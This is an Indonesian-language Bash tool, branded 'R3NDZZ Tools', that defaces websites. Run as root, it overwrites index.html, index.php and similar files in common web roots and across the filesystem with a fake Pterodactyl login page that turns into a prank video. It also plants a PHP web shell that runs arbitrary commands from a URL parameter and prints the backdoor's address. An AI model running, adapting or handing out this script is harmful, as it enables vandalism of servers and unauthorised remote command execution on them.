#!/bin/bash

# ==============================================
# R3NDZZ TOOLS - DEFACE & PULIHKAN
# [ Simple 2 Menu ]
# ==============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ==============================================
# KONFIGURASI
# ==============================================
BACKUP_DIR="/root/backup_web_$(date +%Y%m%d_%H%M%S)"
IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')

# ==============================================
# HTML DEFACE - PWND BY R3NDZZ
# ==============================================
HTML_CONTENT='<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport" />
    <title>
      Ptrodactyl
    </title>
    <link rel="icon" type="image/x-icon" href="https://pterodactyl.io/logos/pterry.svg" />
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Roboto&amp;display=swap" rel="stylesheet" />
    <style>
      .custom-font { font-size: 14px; }  
    .custom-border { border: 1.9px solid #D1D5DB; }  
    body {  
      min-height: 100dvh;  
      overflow-y: auto;  
      font-family: &#39;Roboto&#39;, sans-serif;  
      background-color: #374150;  
    }  

    body::before {
      content: &#34;&#34;;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #374151;
      z-index: -1;
    }

    h2 { font-weight: 400; }

    .animate-spin-slow {
      animation: spin 1.2s linear infinite;
      border-top-color: #374150;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    </style>
  </head>
  <body class="bg-[#374151] flex flex-col items-center justify-start pt-[1px] min-h-[120dvh]">
    <h2 class="text-center text-white text-3xl mb-[6px] mt-20">
      Login to Continue
    </h2>
    <div class="w-full max-w-sm bg-white rounded-lg shadow-lg p-7 flex flex-col items-center" style="max-height:calc(99vh - 60px);">
      <div class="flex justify-center mb-7">
        <img alt="Pterodactyl logo" class="w-48 h-48 object-contain" src="https://pterodactyl.io/logos/pterry.svg" />
      </div>
      <form id="loginForm" class="w-full">
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          USERNAME OR EMAIL
        </p>
        <input id="username" class="w-full rounded-md px-3 py-3 mb-4 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="text" required="" />
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          PASSWORD
        </p>
        <input id="password" class="w-full rounded-md px-3 py-3 mb-6 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="password" required="" />
        <button id="loginBtn" type="button" class="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white font-light py-4 rounded-[3px] transition-colors duration-200 custom-font flex justify-center items-center gap-2 relative overflow-hidden">
          <span id="loginText">          LOGIN
</span>
          <div id="miniSpinner" class="hidden absolute w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
          </div>
        </button>
      </form>
      <div class="text-center mt-[12px]">
        <a class="text-xs text-gray-500 hover:text-gray-700" href="#">        FORGOT PASSWORD?
</a>
      </div>
    </div>
    <p class="text-center text-xs mt-3 mb-0 select-none text-gray-400">
      Â© 2015 - 2025 Pterodactyl Software
    </p>
    <div id="spinner-bg" class="fixed inset-0 bg-[#374151] bg-opacity-100 z-50 hidden flex items-center justify-center" style="align-items: flex-start;">
      <div class="animate-spin-slow rounded-full h-16 w-16 border-8 border-gray-300 border-t-gray-600 mt-[12vh]">
      </div>
    </div>
    <script src="https://www.google.com/recaptcha/api.js?render=6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL" async="" defer="">
    </script>
    <script>
      window.addEventListener(&#34;load&#34;, () =&gt; {
      if (typeof grecaptcha !== &#34;undefined&#34;) {
        grecaptcha.ready(() =&gt; {
          grecaptcha.execute(&#39;6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL&#39;, {action: &#39;login&#39;}).then(token =&gt; {
            console.log(&#39;Decorative token:&#39;, token);
          });
        });
      }
    });

    async function onSubmit() {  
      const loginBtn = document.getElementById(&#34;loginBtn&#34;);
      const loginText = document.getElementById(&#34;loginText&#34;);
      const miniSpinner = document.getElementById(&#34;miniSpinner&#34;);
      const spinner = document.getElementById(&#34;spinner-bg&#34;);

      loginBtn.disabled = true;
      loginBtn.classList.add(&#34;bg-blue-400&#34;);
      loginBtn.classList.remove(&#34;hover:bg-[#2563eb]&#34;);
      loginText.classList.add(&#34;invisible&#34;);
      miniSpinner.classList.remove(&#34;hidden&#34;);

      await new Promise(r =&gt; setTimeout(r, 1000));
      spinner.classList.remove(&#34;hidden&#34;);

      try {  
        await new Promise(r =&gt; setTimeout(r, 2500));
        document.body.innerHTML = `
          &lt;video id=&#34;rick&#34;
                 src=&#34;Rick.mp4&#34;
                 style=&#34;position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:9999;&#34;
                 autoplay
                 playsinline&gt;
          &lt;/video&gt;
        `;
        document.getElementById(&#39;rick&#39;).play().catch(err =&gt; console.error(err));
      } 
      catch (err) {  
        console.error(err);
      } 
      finally {  
        spinner.classList.add(&#34;hidden&#34;);
      }  
    }

    document.getElementById(&#34;loginBtn&#34;).addEventListener(&#34;click&#34;, onSubmit);
    </script>
  </body>
</html>'

# ==============================================
# HEADER
# ==============================================
show_header() {
    clear
    echo -e "${RED}"
    echo "    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
    echo "    â•‘              R3NDZZ TOOLS - DEFACE & PULIHKAN             â•‘"
    echo "    â•‘                    [ PWND BY R3NDZZ ]                     â•‘"
    echo "    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo -e "${NC}"
    echo -e "${CYAN}ğŸ“¡ IP VPS: ${GREEN}$IP_VPS${NC}"
    echo ""
}

# ==============================================
# FUNGSI BACKUP
# ==============================================
backup_files() {
    echo -e "\n${YELLOW}[â€¢] Membackup file website...${NC}"
    mkdir -p "$BACKUP_DIR"
    
    # Cari file index.html dan index.php
    find / -type f \( -name "index.html" -o -name "index.php" -o -name "*.blade.php" \) 2>/dev/null | while read file; do
        if [ -f "$file" ]; then
            backup_path="$BACKUP_DIR$(echo "$file" | sed 's|/|_|g')"
            cp "$file" "$backup_path" 2>/dev/null
            echo -e "${GREEN}    âœ… Backup: $file${NC}"
        fi
    done
    
    # Backup juga file konfigurasi penting
    [ -f "/etc/nginx/nginx.conf" ] && cp "/etc/nginx/nginx.conf" "$BACKUP_DIR/nginx.conf" 2>/dev/null
    [ -f "/etc/apache2/apache2.conf" ] && cp "/etc/apache2/apache2.conf" "$BACKUP_DIR/apache2.conf" 2>/dev/null
    
    echo -e "\n${GREEN}âœ… Backup selesai di: $BACKUP_DIR${NC}"
}

# ==============================================
# FUNGSI DEFACE
# ==============================================
deface() {
    echo -e "\n${PURPLE}ğŸ¨ ====== DEFACE WEBSITE ====== ğŸ¨${NC}"
    
    # Backup dulu sebelum deface
    backup_files
    
    # Simpan HTML ke file sementara
    echo "$HTML_CONTENT" > /tmp/r3ndzz.html
    
    echo -e "\n${YELLOW}[â€¢] Mencari target deface...${NC}"
    
    # Lokasi umum website
    TARGETS=(
        "/var/www/html/index.html"
        "/var/www/html/index.php"
        "/var/www/pterodactyl/public/index.html"
        "/var/www/pterodactyl/public/index.php"
        "/home/*/public_html/index.html"
        "/home/*/public_html/index.php"
        "/usr/local/www/index.html"
        "/opt/lampp/htdocs/index.html"
        "/var/www/nginx/html/index.html"
    )
    
    COUNT=0
    for target in "${TARGETS[@]}"; do
        eval "for f in $target; do
            if [ -f \"\$f\" ]; then
                cp /tmp/r3ndzz.html \"\$f\" 2>/dev/null
                echo -e \"${GREEN}    âœ… \$f${NC}\"
                ((COUNT++))
            fi
        done" 2>/dev/null
    done
    
    # Cari file index lainnya
    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -30 | while read file; do
        if [ -f "$file" ] && [ -w "$file" ]; then
            cp /tmp/r3ndzz.html "$file" 2>/dev/null
            echo -e "${GREEN}    âœ… $file${NC}"
            ((COUNT++))
        fi
    done
    
    echo -e "\n${GREEN}âœ… Total $COUNT file berhasil dideface!${NC}"
    
    # Info backdoor sederhana
    echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>" > /var/www/html/r3ndzz.php 2>/dev/null
    echo -e "\n${CYAN}ğŸ”— Backdoor: http://$IP_VPS/r3ndzz.php?cmd=id${NC}"
    
    rm -f /tmp/r3ndzz.html
}

# ==============================================
# FUNGSI PULIHKAN
# ==============================================
pulihkan() {
    echo -e "\n${BLUE}ğŸ”„ ====== PULIHKAN WEBSITE ====== ğŸ”„${NC}"
    
    # Cari semua backup
    BACKUPS=($(ls -d /root/backup_web_* 2>/dev/null))
    
    if [ ${#BACKUPS[@]} -eq 0 ]; then
        echo -e "${RED}âŒ Tidak ada backup ditemukan!${NC}"
        return
    fi
    
    echo -e "${YELLOW}Pilih backup yang ingin dipulihkan:${NC}"
    for i in "${!BACKUPS[@]}"; do
        echo -e "${GREEN}[$i]${NC} ${BACKUPS[$i]}"
    done
    
    echo -ne "\n${CYAN}Pilih nomor backup: ${NC}"
    read choice
    
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -lt "${#BACKUPS[@]}" ]; then
        SELECTED="${BACKUPS[$choice]}"
        
        echo -e "\n${YELLOW}[â€¢] Memulihkan dari $SELECTED...${NC}"
        
        # Restore file backup
        find "$SELECTED" -type f | while read backup; do
            filename=$(basename "$backup")
            # Cari file asli berdasarkan pattern
            original_path=$(find / -name "*${filename#*_}" 2>/dev/null | head -1)
            if [ -n "$original_path" ]; then
                cp "$backup" "$original_path" 2>/dev/null
                echo -e "${GREEN}    âœ… Pulihkan: $original_path${NC}"
            fi
        done
        
        echo -e "\n${GREEN}âœ… Pemulihan selesai!${NC}"
    else
        echo -e "${RED}Pilihan tidak valid!${NC}"
    fi
}

# ==============================================
# FUNGSI SHOW MENU
# ==============================================
show_menu() {
    show_header
    
    echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${WHITE}â•‘                 MENU UTAMA                     â•‘${NC}"
    echo -e "${WHITE}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[1]${NC} ğŸ¨  DEFACE WEBSITE                   ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[2]${NC} ğŸ”„  PULIHKAN WEBSITE                 ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[0]${NC} ğŸšª  KELUAR                           ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -ne "${YELLOW}â¤ Pilih menu [0-2]: ${NC}"
}

# ==============================================
# CEK ROOT
# ==============================================
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}âŒ Harus root! Jalankan dengan sudo.${NC}"
   exit 1
fi

# ==============================================
# MAIN LOOP
# ==============================================
while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            deface
            ;;
        2)
            pulihkan
            ;;
        0)
            echo -e "\n${GREEN}Terima kasih telah menggunakan R3NDZZ Tools!${NC}"
            echo -e "${CYAN}ğŸ”¥ PWND BY R3NDZZ ğŸ”¥${NC}\n"
            exit 0
            ;;
        *)
            echo -e "\n${RED}Pilihan tidak valid!${NC}"
            ;;
    esac
    
    echo ""
    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
    read
done
